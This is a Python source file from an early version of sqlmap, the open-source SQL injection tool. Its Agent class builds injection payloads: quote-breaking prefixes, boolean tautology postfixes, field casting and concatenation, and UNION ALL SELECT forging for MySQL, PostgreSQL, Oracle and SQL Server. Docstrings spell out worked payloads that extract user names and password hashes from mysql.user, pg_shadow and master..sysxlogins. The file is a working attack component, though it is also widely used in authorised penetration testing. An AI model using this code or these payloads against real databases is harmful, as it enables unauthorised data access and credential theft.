#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import queries
from lib.core.data import temp
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUnsupportedDBMSException


class Agent:
    """
    This class defines the SQL agent methods.
    """

    def __init__(self):
        temp.delimiter = randomStr(6)
        temp.start     = randomStr(6)
        temp.stop      = randomStr(6)


    def payload(self, place=None, parameter=None, value=None, newValue=None, negative=False):
        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """

        negValue = ""
        retValue = ""

        if negative == True or conf.paramNegative == True:
            negValue = "-"

        # After identifing the injectable parameter
        if kb.injPlace == "User-Agent":
            retValue = kb.injParameter.replace(kb.injParameter,
                                               "%s%s" % (negValue, kb.injParameter + newValue))
        elif kb.injParameter:
            paramString = conf.parameters[kb.injPlace]
            paramDict = conf.paramDict[kb.injPlace]
            value = paramDict[kb.injParameter]
            retValue = paramString.replace("%s=%s" % (kb.injParameter, value),
                                           "%s=%s%s" % (kb.injParameter, negValue, value + newValue))

        # Before identifing the injectable parameter
        elif parameter == "User-Agent":
            retValue = value.replace(value, newValue)
        else:
            paramString = conf.parameters[place]
            retValue = paramString.replace("%s=%s" % (parameter, value),
                                           "%s=%s" % (parameter, newValue))

        return retValue


    def fullPayload(self, query):
        query   = self.prefixQuery(query)
        query   = self.postfixQuery(query)
        payload = self.payload(newValue=query)

        return payload


    def prefixQuery(self, string):
        """
        This method defines how the input string has to be escaped
        to perform the injection depending on the injection type
        identified as valid
        """

        query = ""

        if conf.prefix:
            query = conf.prefix
        else:
            if kb.injType == "numeric" or conf.postfix:
                pass
            elif kb.injType in ( "stringsingle", "likesingle" ):
                query = "'"
            elif kb.injType in ( "stringdouble", "likedouble" ):
                query = "\""
            else:
                raise sqlmapNoneDataException, "unsupported injection type"

            if kb.parenthesis not in ( None, 0 ):
                query += "%s " % (")" * kb.parenthesis)

        query += string

        return query


    def postfixQuery(self, string, comment=None):
        """
        This method appends the DBMS comment to the
        SQL injection request
        """

        randInt = randomInt()
        randStr = randomStr()

        if comment:
            string += comment

        if conf.postfix:
            string += " %s" % conf.postfix
        else:
            if kb.parenthesis != None:
                string += " AND %s" % ("(" * kb.parenthesis)
            else:
                raise sqlmapNoneDataException, "unable to get the number of parenthesis"

            if kb.injType == "numeric":
                string += "%d=%d" % (randInt, randInt)
            elif kb.injType == "stringsingle":
                string += "'%s'='%s" % (randStr, randStr)
            elif kb.injType == "likesingle":
                string += "'%s' LIKE '%s" % (randStr, randStr)
            elif kb.injType == "stringdouble":
                string += "\"%s\"=\"%s" % (randStr, randStr)
            elif kb.injType == "likedouble":
                string += "\"%s\" LIKE \"%s" % (randStr, randStr)
            else:
                raise sqlmapNoneDataException, "unsupported injection type"

        return string


    def nullAndCastField(self, field):
        """
        Take in input a field string and return its processed nulled and
        casted field string.

        Examples:

        MySQL input:  VERSION()
        MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
        MySQL scope:  VERSION()

        PostgreSQL input:  VERSION()
        PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  VERSION()

        Oracle input:  banner
        Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1

        Microsoft SQL Server input:  @@VERSION
        Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  @@VERSION

        @param field: field string to be processed
        @type field: C{str}

        @return: field string nulled and casted
        @rtype: C{str}
        """

        nulledCastedField = queries[kb.dbms].cast % field
        nulledCastedField = queries[kb.dbms].isnull % nulledCastedField

        return nulledCastedField


    def nullCastConcatFields(self, fields):
        """
        Take in input a sequence of fields string and return its processed
        nulled, casted and concatenated fields string.

        Examples:

        MySQL input:  user,password
        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
        MySQL scope:  SELECT user, password FROM mysql.user

        PostgreSQL input:  usename,passwd
        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow

        Oracle input:  COLUMN_NAME,DATA_TYPE
        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'

        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins

        @param fields: fields string to be processed
        @type fields: C{str}

        @return: fields string nulled, casted and concatened
        @rtype: C{str}
        """

        if not kb.dbmsDetected:
            return fields

        fields             = fields.replace(", ", ",")
        fieldsSplitted     = fields.split(",")
        dbmsDelimiter      = queries[kb.dbms].delimiter
        nulledCastedFields = []

        for field in fieldsSplitted:
            nulledCastedFields.append(self.nullAndCastField(field))

        delimiterStr = "%s'%s'%s" % (dbmsDelimiter, temp.delimiter, dbmsDelimiter)
        nulledCastedConcatFields = delimiterStr.join([field for field in nulledCastedFields])

        return nulledCastedConcatFields


    def getFields(self, query):
        """
        Take in input a query string and return its fields (columns) and
        more details.

        Example:

        Input:  SELECT user, password FROM mysql.user
        Output: user,password

        @param query: query to be processed
        @type query: C{str}

        @return: query fields (columns) and more details
        @rtype: C{str}
        """

        fieldsSelectTop      = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
        fieldsSelectDistinct = re.search("\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", query, re.I)
        fieldsSelectFrom     = re.search("\ASELECT\s+(.+?)\s+FROM\s+", query, re.I)
        fieldsSelect         = re.search("\ASELECT\s+(.*)", query, re.I)
        fieldsNoSelect       = query

        if fieldsSelectTop:
            fieldsToCastStr = fieldsSelectTop.groups()[0]
        elif fieldsSelectDistinct:
            fieldsToCastStr = fieldsSelectDistinct.groups()[0]
        elif fieldsSelectFrom:
            fieldsToCastStr = fieldsSelectFrom.groups()[0]
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.groups()[0]
        elif fieldsNoSelect:
            fieldsToCastStr = fieldsNoSelect

        fieldsToCastList = fieldsToCastStr.replace(", ", ",")
        fieldsToCastList = fieldsToCastList.split(",")

        # TODO: really needed?!
        #if query.startswith("SELECT ") and "(SELECT " in query:
        #    fieldsSelectFrom = None

        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsToCastList, fieldsToCastStr


    def concatQuery(self, query):
        """
        Take in input a query string and return its processed nulled,
        casted and concatenated query string.

        Examples:

        MySQL input:  SELECT user, password FROM mysql.user
        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user

        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow

        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins

        @param query: query string to be processed
        @type query: C{str}

        @return: query string nulled, casted and concatenated
        @rtype: C{str}
        """

        concatQuery = ""
        query       = query.replace(", ", ",")

        fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, _, fieldsToCastStr = self.getFields(query)
        castedFields = self.nullCastConcatFields(fieldsToCastStr)
        concatQuery  = query.replace(fieldsToCastStr, castedFields, 1)

        if kb.dbms == "MySQL":
            if fieldsSelectFrom:
                concatQuery = concatQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
                concatQuery = concatQuery.replace(" FROM ", ",'%s') FROM " % temp.stop, 1)
            elif fieldsSelect:
                concatQuery  = concatQuery.replace("SELECT ", "CONCAT('%s'," % temp.start, 1)
                concatQuery += ",'%s')" % temp.stop
            elif fieldsNoSelect:
                concatQuery = "CONCAT('%s',%s,'%s')" % (temp.start, concatQuery, temp.stop)

        elif kb.dbms in ( "PostgreSQL", "Oracle" ):
            if fieldsSelectFrom:
                concatQuery = concatQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
                concatQuery = concatQuery.replace(" FROM ", "||'%s' FROM " % temp.stop, 1)
            elif fieldsSelect:
                concatQuery  = concatQuery.replace("SELECT ", "'%s'||" % temp.start, 1)
                concatQuery += "||'%s'" % temp.stop
            elif fieldsNoSelect:
                concatQuery = "'%s'||%s||'%s'" % (temp.start, concatQuery, temp.stop)

            if kb.dbms == "Oracle" and ( fieldsSelect or fieldsNoSelect ):
                concatQuery += " FROM DUAL"

        elif kb.dbms == "Microsoft SQL Server":
            if fieldsSelectTop:
                topNum = re.search("\ASELECT\s+TOP\s+([\d]+)\s+", concatQuery, re.I).group(1)
                concatQuery = concatQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, temp.start), 1)
                concatQuery = concatQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
            elif fieldsSelectFrom:
                concatQuery = concatQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
                concatQuery = concatQuery.replace(" FROM ", "+'%s' FROM " % temp.stop, 1)
            elif fieldsSelect:
                concatQuery  = concatQuery.replace("SELECT ", "'%s'+" % temp.start, 1)
                concatQuery += "+'%s'" % temp.stop
            elif fieldsNoSelect:
                concatQuery = "'%s'+%s+'%s'" % (temp.start, concatQuery, temp.stop)

        return concatQuery


    def forgeInbandQuery(self, query, exprPosition=None):
        """
        Take in input an query (pseudo query) string and return its
        processed UNION ALL SELECT query.

        Examples:

        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713

        Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))
        Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738

        Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins
        Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254

        @param query: it is a processed query string unescaped to be
        forged within an UNION ALL SELECT statement
        @type query: C{str}

        @param exprPosition: it is the NULL position where it is possible
        to inject the query
        @type exprPosition: C{int}

        @return: UNION ALL SELECT query string forged
        @rtype: C{str}
        """

        inbandQuery = self.prefixQuery(" UNION ALL SELECT ")

        if query.startswith("TOP"):
            topNum       = re.search("\ATOP\s+([\d]+)\s+", query, re.I).group(1)
            query        = query[len("TOP %s " % topNum):]
            inbandQuery += "TOP %s " % topNum

        if not exprPosition:
            exprPosition = kb.unionPosition

        if kb.dbms == "Oracle" and inbandQuery.endswith(" FROM DUAL"):
            inbandQuery = inbandQuery[:-len(" FROM DUAL")]

        for element in range(kb.unionCount):
            if element > 0:
                inbandQuery += ", "

            if element == exprPosition:
                if " FROM " in query and not query.startswith("SELECT "):
                    conditionIndex = query.index(" FROM ")
                    inbandQuery += query[:conditionIndex]
                else:
                    inbandQuery += query
            else:
                inbandQuery += "NULL"

        if " FROM " in query and not query.startswith("SELECT "):
            conditionIndex = query.index(" FROM ")
            inbandQuery += query[conditionIndex:]

        if kb.dbms == "Oracle":
            if " FROM " not in inbandQuery:
                inbandQuery += " FROM DUAL"

        inbandQuery = self.postfixQuery(inbandQuery, kb.unionComment)

        return inbandQuery


    def limitQuery(self, num, query, field):
        """
        Take in input a query string and return its limited query string.

        Example:

        Input:  SELECT user FROM mysql.users
        Output: SELECT user FROM mysql.users LIMIT <num>, 1

        @param num: limit number
        @type num: C{int}

        @param query: query to be processed
        @type query: C{str}

        @param field: field within the query
        @type field: C{list}

        @return: limited query string
        @rtype: C{str}
        """

        limitedQuery  = query
        limitStr      = queries[kb.dbms].limit
        fromIndex     = limitedQuery.index(" FROM ")
        untilFrom     = limitedQuery[:fromIndex]
        fromFrom      = limitedQuery[fromIndex+1:]

        if kb.dbms in ( "MySQL", "PostgreSQL" ):
            limitStr = queries[kb.dbms].limit % (num, 1)
            limitedQuery += " %s" % limitStr

        elif kb.dbms == "Oracle":
            if " ORDER BY " in limitedQuery and "(SELECT " in limitedQuery:
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            if query.startswith("SELECT "):
                limitedQuery = "%s FROM (%s, %s" % (untilFrom, untilFrom, limitStr)
            else:
                limitedQuery = "%s FROM (SELECT %s, %s" % (untilFrom, ", ".join(f for f in field), limitStr)
            limitedQuery  = limitedQuery % fromFrom
            limitedQuery += "=%d" % (num + 1)

        elif kb.dbms == "Microsoft SQL Server":
            if " ORDER BY " in limitedQuery:
                limitedQuery = limitedQuery[:limitedQuery.index(" ORDER BY ")]

            if not limitedQuery.startswith("SELECT TOP ") and not limitedQuery.startswith("TOP "):
                limitedQuery  = limitedQuery.replace("SELECT ", (limitStr % 1), 1)
                limitedQuery  = "%s WHERE %s " % (limitedQuery, field)
                limitedQuery += "NOT IN (%s" % (limitStr % num)
                limitedQuery += "%s %s)" % (field, fromFrom)
            else:
                topNums         = re.search("TOP\s+([\d]+)\s+.+?\s+FROM\s+.+?\s+WHERE\s+.+?\s+NOT\s+IN\s+\(SELECT\s+TOP\s+([\d]+)\s+", limitedQuery, re.I).groups()
                quantityTopNums = topNums[0]
                limitedQuery    = limitedQuery.replace("TOP %s" % quantityTopNums, "TOP 1", 1)
                startTopNums    = topNums[1]
                limitedQuery    = limitedQuery.replace(" (SELECT TOP %s" % startTopNums, " (SELECT TOP %d" % num)

        return limitedQuery


    def forgeCaseStatement(self, expression):
        """
        Take in input a query string and return its CASE statement query
        string.

        Example:

        Input:  (SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
        Output: SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y') THEN 1 ELSE 0 END)

        @param expression: expression to be processed
        @type num: C{str}

        @return: processed expression
        @rtype: C{str}
        """

        return queries[kb.dbms].case % expression


# SQL agent
agent = Agent()
